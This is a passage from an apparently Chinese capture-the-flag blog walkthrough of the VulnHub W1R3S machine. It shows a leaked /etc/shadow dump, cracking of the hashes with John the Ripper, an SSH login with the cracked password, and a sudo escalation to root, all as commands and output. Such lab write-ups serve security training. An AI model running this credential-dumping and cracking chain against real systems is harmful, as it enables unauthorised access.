0 2px rgba(0, 0, 0, 0.1);</span><br><span class="line">        text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);</span><br><span class="line">    &#125;</span><br><span class="line">    .description_alert&#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        font-size:12px;</span><br><span class="line">        text-shadow:0 1px #FFFFFF;</span><br><span class="line">        font-weight: normal;</span><br><span class="line">        padding: 5px 0px 5px 0px;</span><br><span class="line">    &#125;</span><br><span class="line">    .btnClose_alert&#123;</span><br><span class="line">        position:absolute;</span><br><span class="line">        top: 4px; right: 2px;</span><br><span class="line">        width:22px;</span><br><span class="line">        height:22px;</span><br><span class="line">        cursor:pointer;</span><br><span class="line">        background:url(js/cuppa/cuppa_images/close_white.png) no-repeat;</span><br><span class="line">        background-position: center;</span><br><span class="line">        background-size: 13px;</span><br><span class="line">    &#125;</span><br><span class="line">    .content_alert_config&#123;</span><br><span class="line">        position:relative;</span><br><span class="line">        clear:both;</span><br><span class="line">        margin: 2px;</span><br><span class="line">        margin-top: 0px;</span><br><span class="line">        height: 401px;</span><br><span class="line">        padding: 10px;</span><br><span class="line">        overflow: auto;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">        function CloseDefaultAlert()&#123;</span><br><span class="line">                cuppa.setContent(&#123;&#x27;load&#x27;:false, duration:0.2&#125;);</span><br><span class="line">        cuppa.blockade(&#123;&#x27;load&#x27;:false, duration:0.2, delay:0.1&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div class=&quot;alert_config_field&quot; id=&quot;alert&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;alert_config_top&quot;&gt;</span><br><span class="line">        &lt;strong&gt;Configuration&lt;/strong&gt;:         &lt;div class=&quot;btnClose_alert&quot; id=&quot;btnClose_alert&quot; onclick=&quot;CloseDefaultAlert()&quot;&gt;&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div id=&quot;content_alert_config&quot; class=&quot;content_alert_config&quot;&gt;</span><br><span class="line">        root:$6$vYcecPCy$JNbK.hr7HU72ifLxmjpIP9kTcx./ak2MM3lBs.Ouiu0mENav72TfQIs8h1jPm2rwRFqd87HDC0pi7gn9t7VgZ0:17554:0:99999:7:::</span><br><span class="line">daemon:*:17379:0:99999:7:::</span><br><span class="line">bin:*:17379:0:99999:7:::</span><br><span class="line">sys:*:17379:0:99999:7:::</span><br><span class="line">sync:*:17379:0:99999:7:::</span><br><span class="line">games:*:17379:0:99999:7:::</span><br><span class="line">man:*:17379:0:99999:7:::</span><br><span class="line">lp:*:17379:0:99999:7:::</span><br><span class="line">mail:*:17379:0:99999:7:::</span><br><span class="line">news:*:17379:0:99999:7:::</span><br><span class="line">uucp:*:17379:0:99999:7:::</span><br><span class="line">proxy:*:17379:0:99999:7:::</span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">backup:*:17379:0:99999:7:::</span><br><span class="line">list:*:17379:0:99999:7:::</span><br><span class="line">irc:*:17379:0:99999:7:::</span><br><span class="line">gnats:*:17379:0:99999:7:::</span><br><span class="line">nobody:*:17379:0:99999:7:::</span><br><span class="line">systemd-timesync:*:17379:0:99999:7:::</span><br><span class="line">systemd-network:*:17379:0:99999:7:::</span><br><span class="line">systemd-resolve:*:17379:0:99999:7:::</span><br><span class="line">systemd-bus-proxy:*:17379:0:99999:7:::</span><br><span class="line">syslog:*:17379:0:99999:7:::</span><br><span class="line">_apt:*:17379:0:99999:7:::</span><br><span class="line">messagebus:*:17379:0:99999:7:::</span><br><span class="line">uuidd:*:17379:0:99999:7:::</span><br><span class="line">lightdm:*:17379:0:99999:7:::</span><br><span class="line">whoopsie:*:17379:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:17379:0:99999:7:::</span><br><span class="line">avahi:*:17379:0:99999:7:::</span><br><span class="line">dnsmasq:*:17379:0:99999:7:::</span><br><span class="line">colord:*:17379:0:99999:7:::</span><br><span class="line">speech-dispatcher:!:17379:0:99999:7:::</span><br><span class="line">hplip:*:17379:0:99999:7:::</span><br><span class="line">kernoops:*:17379:0:99999:7:::</span><br><span class="line">pulse:*:17379:0:99999:7:::</span><br><span class="line">rtkit:*:17379:0:99999:7:::</span><br><span class="line">saned:*:17379:0:99999:7:::</span><br><span class="line">usbmux:*:17379:0:99999:7:::</span><br><span class="line">../images:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br><span class="line">sshd:*:17554:0:99999:7:::</span><br><span class="line">ftp:*:17554:0:99999:7:::</span><br><span class="line">mysql:!:17554:0:99999:7:::</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;  </span><br></pre></td></tr></table></figure>

<h3 id="john破解shadow"><a href="#john破解shadow" class="headerlink" title="john破解shadow"></a>john破解shadow</h3><p>www-data以及../images文件是我们很感兴趣的，我们可以把他们拷贝下来，破解</p>
<p>字典跑不跑的出来，还是看运气</p>
<p>很幸运，很快就跑出来了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/../images$ sudo vim hash                                                                                                                            </span><br><span class="line">                                                                                                                                                                                                 </span><br><span class="line">kali@kali:~/../images$ cat hash     </span><br><span class="line">www-data:$6$8JMxE7l0$yQ16jM..ZsFxpoGue8/0LBUnTas23zaOqg2Da47vmykGTANfutzM8MuFidtb0..Zk.TUKDoDAVRCoXiZAH.Ud1:17560:0:99999:7:::</span><br><span class="line">backup:*:17379:0:99999:7:::</span><br><span class="line">list:*:17379:0:99999:7:::</span><br><span class="line">irc:*:17379:0:99999:7:::</span><br><span class="line">gnats:*:17379:0:99999:7:::</span><br><span class="line">nobody:*:17379:0:99999:7:::</span><br><span class="line">systemd-timesync:*:17379:0:99999:7:::</span><br><span class="line">systemd-network:*:17379:0:99999:7:::</span><br><span class="line">systemd-resolve:*:17379:0:99999:7:::</span><br><span class="line">systemd-bus-proxy:*:17379:0:99999:7:::</span><br><span class="line">syslog:*:17379:0:99999:7:::</span><br><span class="line">_apt:*:17379:0:99999:7:::</span><br><span class="line">messagebus:*:17379:0:99999:7:::</span><br><span class="line">uuidd:*:17379:0:99999:7:::</span><br><span class="line">lightdm:*:17379:0:99999:7:::</span><br><span class="line">whoopsie:*:17379:0:99999:7:::</span><br><span class="line">avahi-autoipd:*:17379:0:99999:7:::</span><br><span class="line">avahi:*:17379:0:99999:7:::</span><br><span class="line">dnsmasq:*:17379:0:99999:7:::</span><br><span class="line">colord:*:17379:0:99999:7:::</span><br><span class="line">speech-dispatcher:!:17379:0:99999:7:::</span><br><span class="line">hplip:*:17379:0:99999:7:::</span><br><span class="line">kernoops:*:17379:0:99999:7:::</span><br><span class="line">pulse:*:17379:0:99999:7:::</span><br><span class="line">rtkit:*:17379:0:99999:7:::</span><br><span class="line">saned:*:17379:0:99999:7:::</span><br><span class="line">usbmux:*:17379:0:99999:7:::</span><br><span class="line">../images:$6$xe/eyoTx$gttdIYrxrstpJP97hWqttvc5cGzDNyMb0vSuppux4f2CcBv3FwOt2P1GFLjZdNqjwRuP3eUjkgb/io7x9q1iP.:17567:0:99999:7:::</span><br><span class="line"></span><br><span class="line">                                                                                                                                                                                                 </span><br><span class="line">kali@kali:~/../images$ john hash                                                </span><br><span class="line">Warning: detected hash type &quot;sha512crypt&quot;, but the string is also recognized as &quot;HMAC-SHA256&quot;</span><br><span class="line">Use the &quot;--format=HMAC-SHA256&quot; option to force loading these as that type instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">www-data         (www-data)     </span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">computer         (../images)     </span><br><span class="line">2g 0:00:00:01 DONE 2/3 (2022-11-26 02:46) 1.351g/s 2182p/s 2183c/s 2183C/s 123456..franklin</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed. </span><br></pre></td></tr></table></figure>

<p>获得了密码</p>
<p>www-data         (www-data)<br>computer         (../images) </p>
<h3 id="尝试ssh登录"><a href="#尝试ssh登录" class="headerlink" title="尝试ssh登录"></a>尝试ssh登录</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/../images$ sudo ssh ../images@192.168.19.177</span><br><span class="line">The authenticity of host &#x27;192.168.19.177 (192.168.19.177)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:Bue5VbUKeMSJMQdicmcMPTCv6xvD7I+20Ki8Um8gcWM.</span><br><span class="line">This key is not known by any other names</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.19.177&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">----------------------</span><br><span class="line">Think this is the way?</span><br><span class="line">----------------------</span><br><span class="line">Well,........possibly.</span><br><span class="line">----------------------</span><br><span class="line">../images@192.168.19.177&#x27;s password: </span><br><span class="line">Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.13.0-36-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line">102 packages can be updated.</span><br><span class="line">0 updates are security updates.</span><br><span class="line"></span><br><span class="line">New release &#x27;18.04.6 LTS&#x27; available.</span><br><span class="line">Run &#x27;do-release-upgrade&#x27; to upgrade to it.</span><br><span class="line"></span><br><span class="line">*** System restart required ***</span><br><span class="line">.....You made it huh?....</span><br><span class="line">Last login: Mon Jan 22 22:47:27 2018 from 192.168.0.35</span><br><span class="line">../images@../images:~$ ls</span><br><span class="line">Desktop  Documents  Downloads  examples.desktop  ftp  Music  Pictures  Public  Templates  Videos</span><br><span class="line">../images@../images:~$ whoami</span><br><span class="line">../images</span><br><span class="line">../images@../images:~$ uname -a</span><br><span class="line">Linux ../images 4.13.0-36-generic #40~16.04.1-Ubuntu SMP Fri Feb 16 23:25:58 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h3><p>发现有有全部的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">../images@../images:~$ sudo -l</span><br><span class="line">[sudo] password for ../images: </span><br><span class="line">Matching Defaults entries for ../images on ../images.localdomain:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User ../images may run the following commands on ../images.localdomain:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直接提权到root，获得flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">../images@../images:~$ sudo /bin/bash</span><br><span class="line">root@../images:~# whoami</span><br><span class="line">root</span><br><span class="line">root@../images:~# cd root</span><br><span class="line">bash: cd: root: No such file or directory</span><br><span class="line">root@../images:~# cd /root</span><br><span class="line">root@../images:/root# ls</span><br><span class="line">flag.txt</span><br><span class="line">root@../images:/root# cat flag.txt</span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line">   ____ ___  _   _  ____ ____      _  _____ _   _ _        _  _____ ___ ___  _   _ ____  </span><br><span class="line">  / ___/ _ \| \ | |/ ___|  _ \    / \|_   _| | | | |      / \|_   _|_ _/ _ \| \ | / ___| </span><br><span class="line"> | |  | | | |  \| | |  _| |_) |  / _ \ | | | | | | |     / _ \ | |  | | | | |  \| \___ \ </span><br><span class="line"> | |__| |_| | |\  | |_| |  _ &lt;  / ___ \| | | |_| | |___ / ___ \| |  | | |_| | |\  |___) |</span><br><span class="line">  \____\___/|_| \_|\____|_| \_\/_/   \_\_|  \___/|_____/_/   \_\_| |___\___/|_| \_|____/ </span><br><span class="line">                                                                                        </span><br><span class="line">-----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">                          .-----------------TTTT_-----_______</span><br><span class="line">                        /&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;(______O] ----------____  \______/]_</span><br><span class="line">     __...---&#x27;&quot;&quot;&quot;\_ --&#x27;&#x27;   Q                               ___________@</span><br><span class="line"> |&#x27;&#x27;&#x27;                   ._   _______________=---------&quot;&quot;&quot;&quot;&quot;&quot;&quot;</span><br><span class="line"> |                ..--&#x27;&#x27;|   l L |_l   |</span><br><span class="line"> |          ..--&#x27;&#x27;      .  /-___j &#x27;   &#x27;</span><br><span class="line"> |    ..--&#x27;&#x27;           /  ,       &#x27;   &#x27;</span><br><span class="line"> |--&#x27;&#x27;                /           `    \</span><br><span class="line">                      L__&#x27;         \    -</span><br><span class="line">                                    -    &#x27;-.</span><br><span class="line">                                     &#x27;.    /</span><br><span class="line">                                       &#x27;-./</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line">  YOU HAVE COMPLETED THE</span><br><span class="line">               __      __  ______________________   _________</span><br><span class="line">              /  \    /  \/_   \______   \_____  \ /   _____/</span><br><span class="line">              \   \/\/   / |   ||       _/ _(__  &lt; \_____  \ </span><br><span class="line">               \        /  |   ||    |   \/       \/        \</span><br><span class="line">                \__/\  /   |___||____|_  /______  /_______  /.INC</span><br><span class="line">                     \/                \/       \/        \/        CHALLENGE, V 1.0</span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">CREATED BY SpecterWires</span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------------------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure>

</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="http://example.com">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2022/11/26/W1R3S/">http://example.com/2022/11/26/W1R3S/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/vulnhub%E9%9D%B6%E6%9C%BA/">vulnhub靶机</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2022/12/04/jarbas/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">jarbas</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2022/12/04/jarbas/" title="jarbas"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-12-04</div><div class="title">jarbas</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">John Doe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">2</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#W1R3S"><span class="toc-number">1.</span> <span class="toc-text">W1R3S</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%80%E6%94%BE%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.1.</span> <span class="toc-text">开放端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%B9%E5%BC%80%E6%94%BE%E7%9A%84%E7%AB%AF%E5%8F%A3%E8%BF%9B%E8%A1%8C%E6%B7%B1%E5%BA%A6%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.2.</span> <span class="toc-text">对开放的端口进行深度扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap%E8%BF%9B%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="toc-number">1.3.</span> <span class="toc-text">nmap进行漏洞扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%93%E7%82%B9"><span class="toc-number">1.4.</span> <span class="toc-text">打点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E6%9E%90ftp%E4%B8%8B%E8%BD%BD%E7%9A%84%E6%96%87%E4%BB%B6"><span class="toc-number">1.4.1.</span> <span class="toc-text">分析ftp下载的文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#80%E7%AB%AF%E5%8F%A3%EF%BC%8Cweb%E9%A1%B5%E9%9D%A2"><span class="toc-number">1.4.2.</span> <span class="toc-text">80端口，web页面</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4"><span class="toc-number">1.4.3.</span> <span class="toc-text">目录爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8kali%E5%AF%BB%E6%89%BEcuppa-cms%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.4.</span> <span class="toc-text">利用kali寻找cuppa cms的漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#john%E7%A0%B4%E8%A7%A3shadow"><span class="toc-number">1.4.5.</span> <span class="toc-text">john破解shadow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95ssh%E7%99%BB%E5%BD%95"><span class="toc-number">1.4.6.</span> <span class="toc-text">尝试ssh登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%8F%90%E6%9D%83"><span class="toc-number">1.4.7.</span> <span class="toc-text">sudo提权</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/12/04/jarbas/" title="jarbas"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="jarbas"/></a><div class="content"><a class="title" href="/2022/12/04/jarbas/" title="jarbas">jarbas</a><time datetime="2022-12-04T05:03:14.000Z" title="Created 2022-12-04 13:03:14">2022-12-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/11/26/W1R3S/" title="W1R3S"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="W1R3S"/></a><div class="content"><a class="title" href="/2022/11/26/W1R3S/" title="W1R3S">W1R3S</a><time datetime="2022-11-26T07:54:54.000Z" title="Created 2022-11-26 15:54:54">2022-11-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By John Doe</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>